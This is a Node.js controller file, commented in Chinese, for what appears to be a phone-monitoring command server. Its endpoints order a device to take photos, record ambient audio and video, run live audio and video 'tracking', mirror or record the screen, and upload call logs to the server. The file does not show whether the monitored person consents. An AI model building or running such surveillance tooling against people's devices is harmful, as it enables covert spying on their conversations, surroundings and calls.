/**
 * 设备控制功能控制器
 */

const Device = require('../models/Device');
const { query, queryOne, insert, update } = require('../database/connection');
const { cache } = require('../database/redis');
const logger = require('../utils/logger');
const config = require('../config');
const socketManager = require('../socket/socketManager');
const path = require('path');
const fs = require('fs').promises;

/**
 * 远程拍照
 */
const takePhoto = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { camera = 'back', quality = 'high' } = req.body;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 检查权限
    if (!device.permissions.camera) {
      return res.status(403).json({
        success: false,
        message: '设备未授权相机权限'
      });
    }

    // 生成任务ID
    const taskId = `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // 发送控制指令到设备
    const command = {
      type: 'take_photo',
      task_id: taskId,
      camera,
      quality,
      timestamp: new Date().toISOString(),
      // 添加直接上传到服务器的标志
      direct_upload: true
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'take_photo', {
      camera,
      quality,
      task_id: taskId
    }, req.user.id);

    // 缓存任务信息
    await cache.set(`task:${taskId}`, {
      type: 'take_photo',
      device_id: deviceId,
      user_id: req.user.id,
      status: 'pending',
      camera,
      quality,
      created_time: new Date()
    }, 3600); // 1小时过期

    res.json({
      success: true,
      message: '远程拍照指令已发送',
      data: {
        task_id: taskId,
        status: 'pending'
      }
    });
  } catch (error) {
    logger.error('远程拍照失败:', error);
    res.status(500).json({
      success: false,
      message: '远程拍照失败'
    });
  }
};

/**
 * 环境录音
 */
const recordAudio = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { duration = 120, quality = 'medium' } = req.body;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 检查权限
    if (!device.permissions.microphone) {
      return res.status(403).json({
        success: false,
        message: '设备未授权麦克风权限'
      });
    }

    // 生成任务ID
    const taskId = `audio_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // 发送控制指令到设备
    const command = {
      type: 'record_audio',
      task_id: taskId,
      duration,
      quality,
      timestamp: new Date().toISOString(),
      // 添加直接上传到服务器的标志
      direct_upload: true
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'record_audio', {
      duration,
      quality,
      task_id: taskId
    }, req.user.id);

    // 缓存任务信息
    await cache.set(`task:${taskId}`, {
      type: 'record_audio',
      device_id: deviceId,
      user_id: req.user.id,
      status: 'pending',
      duration,
      quality,
      created_time: new Date(),
      expected_end_time: new Date(Date.now() + duration * 1000)
    }, 3600 + duration); // 过期时间为录音时长+1小时

    res.json({
      success: true,
      message: '环境录音指令已发送',
      data: {
        task_id: taskId,
        status: 'pending',
        duration,
        expected_end_time: new Date(Date.now() + duration * 1000)
      }
    });
  } catch (error) {
    logger.error('环境录音失败:', error);
    res.status(500).json({
      success: false,
      message: '环境录音失败'
    });
  }
};

/**
 * 远程录像
 */
const recordVideo = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { camera = 'back', duration = 60, quality = 'medium' } = req.body;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 检查权限
    if (!device.permissions.camera) {
      return res.status(403).json({
        success: false,
        message: '设备未授权相机权限'
      });
    }

    // 生成任务ID
    const taskId = `video_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // 发送控制指令到设备
    const command = {
      type: 'record_video',
      task_id: taskId,
      camera,
      duration,
      quality,
      timestamp: new Date().toISOString(),
      // 添加直接上传到服务器的标志
      direct_upload: true
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'record_video', {
      camera,
      duration,
      quality,
      task_id: taskId
    }, req.user.id);

    // 缓存任务信息
    await cache.set(`task:${taskId}`, {
      type: 'record_video',
      device_id: deviceId,
      user_id: req.user.id,
      status: 'pending',
      camera,
      duration,
      quality,
      created_time: new Date(),
      expected_end_time: new Date(Date.now() + duration * 1000)
    }, 3600 + duration); // 过期时间为录像时长+1小时

    res.json({
      success: true,
      message: '远程录像指令已发送',
      data: {
        task_id: taskId,
        status: 'pending',
        duration,
        expected_end_time: new Date(Date.now() + duration * 1000)
      }
    });
  } catch (error) {
    logger.error('远程录像失败:', error);
    res.status(500).json({
      success: false,
      message: '远程录像失败'
    });
  }
};

/**
 * 实时同屏
 */
const startLiveScreen = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { quality = 'high' } = req.body;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 检查权限
    if (!device.permissions.screen_record) {
      return res.status(403).json({
        success: false,
        message: '设备未授权录屏权限'
      });
    }

    // 生成任务ID
    const taskId = `live_screen_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // 发送控制指令到设备
    const command = {
      type: 'live_screen',
      task_id: taskId,
      action: 'start',
      quality,
      timestamp: new Date().toISOString()
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'live_screen', {
      action: 'start',
      quality,
      task_id: taskId
    }, req.user.id);

    // 缓存任务信息
    await cache.set(`task:${taskId}`, {
      type: 'live_screen',
      device_id: deviceId,
      user_id: req.user.id,
      status: 'pending',
      quality,
      created_time: new Date()
    }, 3600); // 1小时过期

    res.json({
      success: true,
      message: '实时同屏已启动',
      data: {
        task_id: taskId,
        status: 'pending'
      }
    });
  } catch (error) {
    logger.error('启动实时同屏失败:', error);
    res.status(500).json({
      success: false,
      message: '启动实时同屏失败'
    });
  }
};

/**
 * 停止实时同屏
 */
const stopLiveScreen = async (req, res) => {
  try {
    const { deviceId } = req.params;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 发送控制指令到设备
    const command = {
      type: 'live_screen',
      action: 'stop',
      timestamp: new Date().toISOString()
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'live_screen', {
      action: 'stop'
    }, req.user.id);

    res.json({
      success: true,
      message: '实时同屏已停止'
    });
  } catch (error) {
    logger.error('停止实时同屏失败:', error);
    res.status(500).json({
      success: false,
      message: '停止实时同屏失败'
    });
  }
};

/**
 * 实况语音追踪
 */
const startLiveAudio = async (req, res) => {
  try {
    const { deviceId } = req.params;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 检查权限
    if (!device.permissions.microphone) {
      return res.status(403).json({
        success: false,
        message: '设备未授权麦克风权限'
      });
    }

    // 生成任务ID
    const taskId = `live_audio_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // 发送控制指令到设备
    const command = {
      type: 'live_audio',
      task_id: taskId,
      action: 'start',
      timestamp: new Date().toISOString(),
      // 添加直接上传到服务器的标志
      direct_upload: true
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'live_audio', {
      action: 'start',
      task_id: taskId
    }, req.user.id);

    // 缓存任务信息
    await cache.set(`task:${taskId}`, {
      type: 'live_audio',
      device_id: deviceId,
      user_id: req.user.id,
      status: 'pending',
      created_time: new Date(),
      auto_stop_time: new Date(Date.now() + 20 * 60 * 1000) // 20分钟后自动停止
    }, 3600); // 1小时过期

    res.json({
      success: true,
      message: '实况语音追踪已启动',
      data: {
        task_id: taskId,
        status: 'pending',
        auto_stop_time: new Date(Date.now() + 20 * 60 * 1000)
      }
    });
  } catch (error) {
    logger.error('启动实况语音追踪失败:', error);
    res.status(500).json({
      success: false,
      message: '启动实况语音追踪失败'
    });
  }
};

/**
 * 停止实况语音追踪
 */
const stopLiveAudio = async (req, res) => {
  try {
    const { deviceId } = req.params;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 发送控制指令到设备
    const command = {
      type: 'live_audio',
      action: 'stop',
      timestamp: new Date().toISOString()
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'live_audio', {
      action: 'stop'
    }, req.user.id);

    res.json({
      success: true,
      message: '实况语音追踪已停止'
    });
  } catch (error) {
    logger.error('停止实况语音追踪失败:', error);
    res.status(500).json({
      success: false,
      message: '停止实况语音追踪失败'
    });
  }
};

/**
 * 实况视频追踪
 */
const startLiveVideo = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { camera = 'back' } = req.body;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 检查权限
    if (!device.permissions.camera) {
      return res.status(403).json({
        success: false,
        message: '设备未授权相机权限'
      });
    }

    // 生成任务ID
    const taskId = `live_video_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // 发送控制指令到设备
    const command = {
      type: 'live_video',
      task_id: taskId,
      action: 'start',
      camera,
      timestamp: new Date().toISOString(),
      // 添加直接上传到服务器的标志
      direct_upload: true
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'live_video', {
      action: 'start',
      camera,
      task_id: taskId
    }, req.user.id);

    // 缓存任务信息
    await cache.set(`task:${taskId}`, {
      type: 'live_video',
      device_id: deviceId,
      user_id: req.user.id,
      status: 'pending',
      camera,
      created_time: new Date(),
      auto_stop_time: new Date(Date.now() + 20 * 60 * 1000) // 20分钟后自动停止
    }, 3600); // 1小时过期

    res.json({
      success: true,
      message: '实况视频追踪已启动',
      data: {
        task_id: taskId,
        status: 'pending',
        camera,
        auto_stop_time: new Date(Date.now() + 20 * 60 * 1000)
      }
    });
  } catch (error) {
    logger.error('启动实况视频追踪失败:', error);
    res.status(500).json({
      success: false,
      message: '启动实况视频追踪失败'
    });
  }
};

/**
 * 停止实况视频追踪
 */
const stopLiveVideo = async (req, res) => {
  try {
    const { deviceId } = req.params;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 发送控制指令到设备
    const command = {
      type: 'live_video',
      action: 'stop',
      timestamp: new Date().toISOString()
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'live_video', {
      action: 'stop'
    }, req.user.id);

    res.json({
      success: true,
      message: '实况视频追踪已停止'
    });
  } catch (error) {
    logger.error('停止实况视频追踪失败:', error);
    res.status(500).json({
      success: false,
      message: '停止实况视频追踪失败'
    });
  }
};

/**
 * 切换摄像头
 */
const switchCamera = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { camera } = req.body;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 检查权限
    if (!device.permissions.camera) {
      return res.status(403).json({
        success: false,
        message: '设备未授权相机权限'
      });
    }

    // 发送控制指令到设备
    const command = {
      type: 'switch_camera',
      camera,
      timestamp: new Date().toISOString()
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'switch_camera', {
      camera
    }, req.user.id);

    res.json({
      success: true,
      message: `已切换到${camera === 'front' ? '前置' : '后置'}摄像头`
    });
  } catch (error) {
    logger.error('切换摄像头失败:', error);
    res.status(500).json({
      success: false,
      message: '切换摄像头失败'
    });
  }
};

/**
 * 获取通话记录
 */
const getCallLogs = async (req, res) => {
  try {
    const { deviceId } = req.params;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 检查权限
    if (!device.permissions.call_log) {
      return res.status(403).json({
        success: false,
        message: '设备未授权通话记录权限'
      });
    }

    // 生成任务ID
    const taskId = `call_logs_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // 发送控制指令到设备
    const command = {
      type: 'get_call_logs',
      task_id: taskId,
      timestamp: new Date().toISOString(),
      // 添加直接上传到服务器的标志
      direct_upload: true
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'get_call_logs', {
      task_id: taskId
    }, req.user.id);

    // 缓存任务信息
    await cache.set(`task:${taskId}`, {
      type: 'get_call_logs',
      device_id: deviceId,
      user_id: req.user.id,
      status: 'pending',
      created_time: new Date()
    }, 3600); // 1小时过期

    res.json({
      success: true,
      message: '获取通话记录指令已发送',
      data: {
        task_id: taskId,
        status: 'pending'
      }
    });
  } catch (error) {
    logger.error('获取通话记录失败:', error);
    res.status(500).json({
      success: false,
      message: '获取通话记录失败'
    });
  }
};

/**
 * 截屏
 */
const takeScreenshot = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { quality = 'high' } = req.body;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 检查权限
    if (!device.permissions.screen_capture) {
      return res.status(403).json({
        success: false,
        message: '设备未授权屏幕截图权限'
      });
    }

    // 生成任务ID
    const taskId = `screenshot_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // 发送控制指令到设备
    const command = {
      type: 'take_screenshot',
      task_id: taskId,
      quality,
      timestamp: new Date().toISOString(),
      // 添加直接上传到服务器的标志
      direct_upload: true
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'take_screenshot', {
      quality,
      task_id: taskId
    }, req.user.id);

    // 缓存任务信息
    await cache.set(`task:${taskId}`, {
      type: 'take_screenshot',
      device_id: deviceId,
      user_id: req.user.id,
      status: 'pending',
      quality,
      created_time: new Date()
    }, 3600); // 1小时过期

    res.json({
      success: true,
      message: '截屏指令已发送',
      data: {
        task_id: taskId,
        status: 'pending'
      }
    });
  } catch (error) {
    logger.error('截屏失败:', error);
    res.status(500).json({
      success: false,
      message: '截屏失败'
    });
  }
};

/**
 * 录屏
 */
const recordScreen = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { duration = 60, quality = 'medium' } = req.body;

    const device = await Device.findById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '设备不存在'
      });
    }

    // 检查设备是否在线
    const isOnline = await Device.isOnline(deviceId);
    if (!isOnline) {
      return res.status(400).json({
        success: false,
        message: '设备离线'
      });
    }

    // 检查权限
    if (!device.permissions.screen_record) {
      return res.status(403).json({
        success: false,
        message: '设备未授权录屏权限'
      });
    }

    // 生成任务ID
    const taskId = `screen_record_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // 发送控制指令到设备
    const command = {
      type: 'record_screen',
      task_id: taskId,
      duration,
      quality,
      timestamp: new Date().toISOString(),
      // 添加直接上传到服务器的标志
      direct_upload: true
    };

    const sent = await socketManager.sendToDevice(device.device_id, command);
    if (!sent) {
      return res.status(400).json({
        success: false,
        message: '设备连接异常，指令发送失败'
      });
    }

    // 记录操作日志
    logger.logDeviceAction(deviceId, 'record_screen', {
      duration,
      quality,
      task_id: taskId
    }, req.user.id);

    // 缓存任务信息
    await cache.set(`task:${taskId}`, {
      type: 'record_screen',
      device_id: deviceId,
      user_id: req.user.id,
      status: 'pending',
      duration,
      quality,
      created_time: new Date(),
      expected_end_time: new Date(Date.now() + duration * 1000)
    }, 3600 + duration); // 过期时间为录屏时长+1小时

    res.json({
      success: true,
      message: '录屏指令已发送',
      data: {
        task_id: taskId,
        status: 'pending',
        duration,
        expected_end_time: new Date(Date.now() + duration * 1000)
      }
    });
  } catch (error) {
    logger.error('录屏失败:', error);
    res.status(500).json({
      success: false,
      message: '录屏失败'
    });
  }
};

/**
 * 获取任务状态
 */
const getTaskStatus = async (req, res) => {
  try {
    const { taskId } = req.params;

    // 从缓存中获取任务信息
    const taskInfo = await cache.get(`task:${taskId}`);
    if (!taskInfo) {
      return res.status(404).json({
        success: false,
        message: '任务不存在或已过期'
      });
    }

    res.json({
      success: true,
      data: taskInfo
    });
  } catch (error) {
    logger.error('获取任务状态失败:', error);
    res.status(500).json({
      success: false,
      message: '获取任务状态失败'
    });
  }
};

module.exports = {
  takePhoto,
  recordAudio,
  recordVideo,
  startLiveAudio,
  stopLiveAudio,
  startLiveVideo,
  stopLiveVideo,
  switchCamera,
  getCallLogs,
  takeScreenshot,
  recordScreen,
  startLiveScreen,
  stopLiveScreen,
  getTaskStatus
};